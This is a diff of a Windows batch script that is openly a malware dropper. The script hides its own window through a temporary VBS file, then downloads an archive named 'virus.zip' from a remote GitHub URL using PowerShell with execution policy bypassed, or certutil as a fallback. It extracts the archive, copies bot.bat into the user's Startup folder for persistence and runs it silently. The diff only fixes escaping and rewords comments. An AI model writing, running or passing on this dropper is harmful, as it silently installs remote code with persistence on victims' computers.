@@ -1,7 +1,7 @@
 @echo off
 if not "%1"=="H" (
     echo Set WshShell = CreateObject("WScript.Shell"^) > "%temp%\hide.vbs"
-    echo WshShell.Run """" & WScript.ScriptFullName & """ H", 0, False >> "%temp%\hide.vbs"
+    echo WshShell.Run """" ^& WScript.ScriptFullName ^& """ H", 0, False >> "%temp%\hide.vbs"
     wscript.exe "%temp%\hide.vbs"
     exit /b
 )
@@ -12,26 +12,26 @@ set "tempdir=%TEMP%"
 set "zipurl=https://raw.githubusercontent.com/banzoxOG/zip/main/virus.zip"
 set "zipfile=%tempdir%\virus.zip"
 
-:: Force TLS 1.2 then download with PowerShell; fallback to certutil
+:: Force TLS 1.2, download with PowerShell; fallback certutil
 powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; try { Invoke-WebRequest -Uri '%zipurl%' -OutFile '%zipfile%' } catch { exit 1 }" >nul 2>&1
 if %errorlevel% neq 0 (
     certutil -urlcache -f "%zipurl%" "%zipfile%" >nul 2>&1
 )
 
-:: Wait a breath
+:: Give it a moment
 ping -n 2 127.0.0.1 >nul
 
-:: Extract directly into %TEMP%, overwrite
+:: Extract all files directly into %TEMP%, overwrite
 powershell -NoProfile -ExecutionPolicy Bypass -Command "Expand-Archive -Path '%zipfile%' -DestinationPath '%tempdir%' -Force;" >nul 2>&1
 
-:: Copy bot.bat to shell:startup and execute
+:: Copy bot.bat to shell:startup and run it silently
 set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 if exist "%tempdir%\bot.bat" (
     copy /y "%tempdir%\bot.bat" "%startup%\bot.bat" >nul 2>&1
     start "" /B "%tempdir%\bot.bat"
 )
 
-:: Kill the helper vbs
+:: Cleanup helper
 del /f /q "%temp%\hide.vbs" >nul 2>&1
 
 exit
